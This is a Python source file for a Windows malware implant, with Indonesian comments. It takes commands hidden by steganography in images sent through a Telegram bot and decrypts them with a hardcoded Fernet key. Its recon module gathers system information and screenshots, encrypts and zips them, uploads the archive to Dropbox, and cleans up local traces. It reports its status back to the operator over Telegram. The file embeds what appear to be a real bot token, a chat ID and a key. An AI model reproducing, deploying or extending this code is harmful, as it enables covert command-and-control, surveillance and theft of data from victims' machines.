import requests
from PIL import Image
import io
from cryptography.fernet import Fernet
import stepic
import sys
import subprocess
import os
from os import path
import time
import random
import platform
import shutil
import mss
import mss.tools
import win32api

# ==================== CONFIGURATION ====================
key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='
TELKEN = '8210714938:AAHAbovQzWwlr8ZRTGyBvAwCh4QOArFILY4'
CHAID = '5457823680'

# ==================== TELEGRAM FUNCTIONS ====================
def getTo(last_update_id=None):
    """
    Mengambil URL file dari Bot Telegram.
    FIX: Sekarang mencari 'document' bukan 'photo' untuk menghindari kompresi.
    """
    try:
        url = f"https://api.telegram.org/bot{TELKEN}/getUpdates"
        params = {'timeout': 100}
        if last_update_id:
            params['offset'] = last_update_id + 1
            
        response = requests.get(url, params=params, timeout=120)
        
        if response.status_code == 200:
            data = response.json()
            if data['ok'] and data['result']:
                # Ambil update terakhir
                for update in reversed(data['result']):
                    current_update_id = update['update_id']
                    
                    if 'message' in update:
                        msg = update['message']
                        file_id = None
                        
                        # PRIORITY: Check for Document (Uncompressed Image)
                        # Program 1 mengirim menggunakan send_document
                        if 'document' in msg:
                            doc = msg['document']
                            # Validasi sederhana apakah itu gambar (mime_type image atau extensi .png)
                            if 'image' in doc.get('mime_type', '') or doc.get('file_name', '').endswith('.png'):
                                file_id = doc['file_id']
                                print(f"[*] Dokumen gambar terdeteksi: {doc.get('file_name')}")

                        # FALLBACK: Check for Photo (Compressed) - Jika pengirim lupa pakai mode dokumen
                        elif 'photo' in msg:
                            photo = msg['photo'][-1] # Ambil resolusi terbesar
                            file_id = photo['file_id']
                            print("[!] Peringatan: Menerima foto terkompresi (Steganografi mungkin rusak)")

                        # Jika file ditemukan, dapatkan URL downloadnya
                        if file_id:
                            file_url = f"https://api.telegram.org/bot{TELKEN}/getFile"
                            file_response = requests.get(file_url, params={'file_id': file_id})
                            
                            if file_response.status_code == 200:
                                file_data = file_response.json()
                                if file_data['ok']:
                                    file_path = file_data['result']['file_path']
                                    download_url = f"https://api.telegram.org/file/bot{TELKEN}/{file_path}"
                                    return download_url, current_update_id
                                    
                    # Return update ID even if no file found, to avoid looping same message
                    return None, current_update_id
                    
        return None, last_update_id
    except Exception as e:
        print(f"[-] Telegram Connection Error: {e}")
        return None, last_update_id

def decodeFromPhoto(URL):
    """Mendekode pesan steganografi dari URL gambar"""
    try:
        print(f"[*] Downloading image from: {URL}...")
        response = requests.get(URL, timeout=60)
        if response.status_code == 200:
            # Menggunakan BytesIO agar tidak perlu save ke disk
            image_data = io.BytesIO(response.content)
            image = Image.open(image_data)
            
            # Stepic decode
            decoded = stepic.decode(image)
            return decoded
        else:
            print("[-] Gagal mendownload gambar.")
            return None
    except Exception as e:
        print(f"[-] Steganography Decode Error: {e}")
        return None

def decrypt(enctext, key):
    """Mendekripsi perintah tersembunyi"""
    try:
        if not enctext: return None
        if isinstance(enctext, str):
            enctext = enctext.encode()
        f = Fernet(key)
        plaintext = f.decrypt(enctext)
        return plaintext.decode()
    except Exception as e:
        print(f"[-] Decryption Error: {e}")
        return None

def sendTelResponse(message):
    """Mengirim laporan status kembali ke penyerang"""
    try:
        url = f"https://api.telegram.org/bot{TELKEN}/sendMessage"
        data = {'chat_id': CHAID, 'text': message}
        requests.post(url, json=data, timeout=30)
    except:
        pass

# ==================== RECON FUNCTIONS (UPGRADED) ====================
def rec(APIKEY):
    """Fitur Recon"""
    dumppath = path.expandvars(r'%LOCALAPPDATA%\Telkom')
    if not os.path.exists(dumppath):
        try:
            os.mkdir(dumppath)
        except:
            return "Failed to create dump directory"
    
    f = Fernet(key)
    
    try:
        # 1. System Info
        command = 'systeminfo'
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = output.stdout.read()
        encrypted_result = f.encrypt(result if result else b"No output")
        
        sysdumpfile = os.path.join(dumppath, 'systeminfo.telkom')
        with open(sysdumpfile, 'wb') as outfile:
            outfile.write(encrypted_result)
        
        # 2. Screenshot (Singkat saja untuk test)
        with mss.mss() as screen:
            filename = screen.shot(mon=-1, output=os.path.join(dumppath, 'monitor-1.png'))
            
        # Encrypt Screenshot
        with open(filename, 'rb') as img_file:
            data = img_file.read()
        enc_img = f.encrypt(data)
        with open(filename + ".enc", 'wb') as enc_file:
            enc_file.write(enc_img)
        os.remove(filename) # Hapus file asli

        # 3. Packaging (ZIP)
        delivery_name = f'Intel_{platform.node()}_{int(time.time())}'
        deliverypath_base = path.expandvars(r'%LOCALAPPDATA%')
        deliveryfile_full = os.path.join(deliverypath_base, delivery_name)
        shutil.make_archive(deliveryfile_full, 'zip', dumppath)
        
        # 4. Exfiltration (Dropbox)
        final_zip = deliveryfile_full + ".zip"
        status_msg = "Recon Done (Local Only)"
        
        if APIKEY and APIKEY != "NO_API_KEY":
            try:
                import dropbox
                # Hati-hati: Dropbox SDK mungkin butuh 'files_upload_v2' atau refresh token di versi baru
                dbx = dropbox.Dropbox(APIKEY)
                with open(final_zip, "rb") as f:
                    dbx.files_upload(f.read(), f"/{os.path.basename(final_zip)}")
                status_msg = "Recon Done & Uploaded to Dropbox"
            except ImportError:
                status_msg = "Recon Done but Dropbox module missing"
            except Exception as e:
                status_msg = f"Recon Done but Upload Failed: {str(e)}"
        
        # Cleanup
        shutil.rmtree(dumppath, ignore_errors=True)
        if os.path.exists(final_zip):
            os.remove(final_zip)
            
        return status_msg
        
    except Exception as e:
        return f"Recon Failed: {str(e)}"

# ==================== MAIN LOGIC ====================
def main():
    print(f"[*] Command Post Listener aktif di: {platform.node()}")
    print(f"[*] Menunggu dokumen steganografi...")
    sendTelResponse(f"🤖 Implant ONLINE: {platform.node()}")
    
    last_processed_update = None

    while True:
        try:
            # Cek Telegram
            photo_url, new_update_id = getTo(last_processed_update)
            
            # Update ID agar tidak memproses pesan yang sama berulang kali
            if new_update_id:
                last_processed_update = new_update_id

            if photo_url:
                print(f"[+] Menerima file, mencoba decode...")
                enctext = decodeFromPhoto(photo_url)
                
                if enctext:
                    print(f"[+] Pesan steganografi ditemukan!")
                    command_raw = decrypt(enctext, key)
                    
                    if command_raw:
                        print(f"[+] Command terdekripsi: {command_raw}")
                        parts = command_raw.split(" ", 1)
                        cmd = parts[0].strip()
                        api = parts[1].strip() if len(parts) > 1 else None
                        
                        if cmd == 'kill':
                            print("[!] Received KILL command.")
                            sendTelResponse("Implant shutting down remotely.")
                            sys.exit(0)
                            
                        elif cmd == 'recon':
                            print("[*] Starting RECON module...")
                            sendTelResponse("Executing Recon...")
                            status = rec(api if api else "NO_API_KEY")
                            sendTelResponse(f"{status}")
                            
                        elif cmd == 'ping':
                            sendTelResponse("Pong! I am alive.")
                            
                        else:
                            print(f"[?] Unknown command: {cmd}")
                    else:
                        print("[-] Gagal mendekripsi payload.")
                else:
                    print("[-] Tidak ada pesan tersembunyi dalam gambar ini.")
            
            # Sleep agar tidak flooding API Telegram
            time.sleep(5)
            
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Critical Error in Main Loop: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()